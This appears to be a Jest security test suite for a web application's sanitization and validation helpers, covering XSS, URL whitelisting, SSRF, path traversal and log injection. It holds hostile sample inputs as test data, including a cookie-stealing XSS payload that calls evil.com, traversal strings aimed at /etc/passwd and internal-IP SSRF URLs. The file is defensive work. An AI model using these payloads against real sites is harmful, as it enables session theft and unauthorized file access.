/**
 * Security Tests
 * Tests for sanitization, validation, and security middleware
 */

import { sanitizeHtml, sanitizeUrl, sanitizePath, sanitizeForLog } from '../utils/sanitizer';
import {
  validateEmail,
  validateUrl,
  validatePasswordStrength,
  validateInteger,
  validateFileExtension
} from '../utils/validator';

describe('Sanitization Functions', () => {
  describe('sanitizeHtml', () => {
    it('should escape XSS attempts', () => {
      const malicious = '<script>alert("XSS")</script>';
      const sanitized = sanitizeHtml(malicious);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('alert(');
    });

    it('should escape HTML entities', () => {
      const input = '<img src=x onerror="alert(1)">';
      const sanitized = sanitizeHtml(input);
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('onerror');
    });

    it('should handle empty strings', () => {
      expect(sanitizeHtml('')).toBe('');
      expect(sanitizeHtml(null as any)).toBe('');
      expect(sanitizeHtml(undefined as any)).toBe('');
    });
  });

  describe('sanitizeUrl', () => {
    it('should block javascript: URLs', () => {
      const malicious = 'javascript:alert(1)';
      expect(() => sanitizeUrl(malicious)).toThrow();
    });

    it('should block data: URLs', () => {
      const malicious = 'data:text/html,<script>alert(1)</script>';
      expect(() => sanitizeUrl(malicious)).toThrow();
    });

    it('should allow valid HTTP URLs', () => {
      const valid = 'https://example.com/path';
      const sanitized = sanitizeUrl(valid);
      expect(sanitized).toBe(valid);
    });

    it('should enforce domain whitelist', () => {
      const url = 'https://evil.com/malicious';
      expect(() => sanitizeUrl(url, ['trusted.com'])).toThrow();
    });

    it('should allow whitelisted domains', () => {
      const url = 'https://api.trusted.com/data';
      const sanitized = sanitizeUrl(url, ['trusted.com']);
      expect(sanitized).toBe(url);
    });
  });

  describe('sanitizePath', () => {
    it('should prevent path traversal with ..', () => {
      const malicious = '../../../etc/passwd';
      expect(() => sanitizePath(malicious, '/safe/dir')).toThrow();
    });

    it('should prevent path traversal with ~', () => {
      const malicious = '~/secret/file';
      expect(() => sanitizePath(malicious, '/safe/dir')).toThrow();
    });

    it('should allow safe paths', () => {
      const safe = 'uploads/user123/file.txt';
      const result = sanitizePath(safe, '/var/www/uploads');
      expect(result).toContain('/var/www/uploads');
    });
  });

  describe('sanitizeForLog', () => {
    it('should remove newlines', () => {
      const input = 'Line 1\nLine 2\rLine 3';
      const sanitized = sanitizeForLog(input);
      expect(sanitized).not.toContain('\n');
      expect(sanitized).not.toContain('\r');
    });

    it('should remove control characters', () => {
      const input = 'Text\x00with\x1Fcontrol\x7Fchars';
      const sanitized = sanitizeForLog(input);
      expect(sanitized).not.toMatch(/[\x00-\x1F\x7F]/);
    });

    it('should handle null and undefined', () => {
      expect(sanitizeForLog(null)).toBe('null');
      expect(sanitizeForLog(undefined)).toBe('null');
    });
  });
});

describe('Validation Functions', () => {
  describe('validateEmail', () => {
    it('should accept valid emails', () => {
      expect(validateEmail('user@example.com')).toBe(true);
      expect(validateEmail('test.user+tag@domain.co.uk')).toBe(true);
    });

    it('should reject invalid emails', () => {
      expect(validateEmail('invalid')).toBe(false);
      expect(validateEmail('missing@domain')).toBe(false);
      expect(validateEmail('@nodomain.com')).toBe(false);
      expect(validateEmail('spaces in@email.com')).toBe(false);
    });
  });

  describe('validateUrl', () => {
    it('should accept valid URLs', () => {
      expect(validateUrl('http://example.com')).toBe(true);
      expect(validateUrl('https://sub.domain.com/path?query=1')).toBe(true);
    });

    it('should reject invalid URLs', () => {
      expect(validateUrl('not-a-url')).toBe(false);
      expect(validateUrl('ftp://example.com')).toBe(false); // Must have http/https
    });
  });

  describe('validatePasswordStrength', () => {
    it('should accept strong passwords', () => {
      const result = validatePasswordStrength('StrongP@ss123');
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject short passwords', () => {
      const result = validatePasswordStrength('Short1!');
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Password must be at least 8 characters long');
    });

    it('should require lowercase letters', () => {
      const result = validatePasswordStrength('UPPERCASE123!');
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('lowercase'))).toBe(true);
    });

    it('should require uppercase letters', () => {
      const result = validatePasswordStrength('lowercase123!');
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('uppercase'))).toBe(true);
    });

    it('should require numbers', () => {
      const result = validatePasswordStrength('NoNumbers!');
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('number'))).toBe(true);
    });

    it('should require special characters', () => {
      const result = validatePasswordStrength('NoSpecial123');
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('special'))).toBe(true);
    });
  });

  describe('validateInteger', () => {
    it('should validate valid integers', () => {
      const result = validateInteger(42);
      expect(result.valid).toBe(true);
      expect(result.value).toBe(42);
    });

    it('should validate string integers', () => {
      const result = validateInteger('42');
      expect(result.valid).toBe(true);
      expect(result.value).toBe(42);
    });

    it('should reject non-integers', () => {
      expect(validateInteger('not-a-number').valid).toBe(false);
      expect(validateInteger(3.14).valid).toBe(false);
    });

    it('should enforce minimum value', () => {
      const result = validateInteger(5, 10);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('at least 10');
    });

    it('should enforce maximum value', () => {
      const result = validateInteger(100, undefined, 50);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('at most 50');
    });

    it('should validate range', () => {
      const result = validateInteger(25, 10, 50);
      expect(result.valid).toBe(true);
      expect(result.value).toBe(25);
    });
  });

  describe('validateFileExtension', () => {
    it('should accept allowed extensions', () => {
      expect(validateFileExtension('photo.jpg', ['jpg', 'png'])).toBe(true);
      expect(validateFileExtension('document.pdf', ['pdf', 'doc'])).toBe(true);
    });

    it('should reject disallowed extensions', () => {
      expect(validateFileExtension('script.exe', ['jpg', 'png'])).toBe(false);
      expect(validateFileExtension('malware.bat', ['pdf', 'doc'])).toBe(false);
    });

    it('should be case insensitive', () => {
      expect(validateFileExtension('PHOTO.JPG', ['jpg'])).toBe(true);
      expect(validateFileExtension('photo.JPG', ['jpg'])).toBe(true);
    });
  });
});

describe('Security Integration Tests', () => {
  describe('XSS Prevention', () => {
    it('should prevent stored XSS', () => {
      const userInput = '<img src=x onerror="fetch(\'evil.com?cookie=\'+document.cookie)">';
      const sanitized = sanitizeHtml(userInput);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('fetch(');
    });

    it('should prevent DOM-based XSS', () => {
      const userInput = '<svg/onload=alert(document.domain)>';
      const sanitized = sanitizeHtml(userInput);
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('alert(');
    });
  });

  describe('SSRF Prevention', () => {
    it('should block internal IP addresses', () => {
      const urls = [
        'http://127.0.0.1/admin',
        'http://82.147.84.78/secret',
        'http://192.168.1.1/internal',
        'http://10.0.0.1/private'
      ];

      urls.forEach(url => {
        expect(() => sanitizeUrl(url, [])).toThrow();
      });
    });

    it('should allow external URLs', () => {
      const url = 'https://api.external.com/public';
      expect(() => sanitizeUrl(url, ['external.com'])).not.toThrow();
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should block common path traversal attempts', () => {
      const attempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32'
      ];

      attempts.forEach(attempt => {
        expect(() => sanitizePath(attempt, '/safe/uploads')).toThrow();
      });
    });
  });

  describe('Log Injection Prevention', () => {
    it('should prevent log forging', () => {
      const malicious = 'user\nINFO: Unauthorized access granted';
      const sanitized = sanitizeForLog(malicious);
      expect(sanitized).not.toContain('\n');
      expect(sanitized.split('\n')).toHaveLength(1);
    });

    it('should prevent ANSI escape codes', () => {
      const malicious = 'user\x1b[31mRED TEXT\x1b[0m';
      const sanitized = sanitizeForLog(malicious);
      expect(sanitized).not.toMatch(/\x1b/);
    });
  });
});

describe('Security Edge Cases', () => {
  it('should handle Unicode in sanitization', () => {
    const unicode = '你好 <script>alert(1)</script> мир';
    const sanitized = sanitizeHtml(unicode);
    expect(sanitized).toContain('你好');
    expect(sanitized).toContain('мир');
    expect(sanitized).not.toContain('<script');
  });

  it('should handle very long inputs', () => {
    const longString = 'A'.repeat(10000) + '<script>alert(1)</script>';
    const sanitized = sanitizeHtml(longString);
    expect(sanitized).not.toContain('<script');
  });

  it('should handle malformed HTML', () => {
    const malformed = '<script><script>alert(1)</script>';
    const sanitized = sanitizeHtml(malformed);
    expect(sanitized).not.toContain('alert(');
  });

  it('should handle null bytes', () => {
    const nullByte = 'text\x00<script>alert(1)</script>';
    const sanitized = sanitizeForLog(nullByte);
    expect(sanitized).not.toMatch(/\x00/);
  });
});

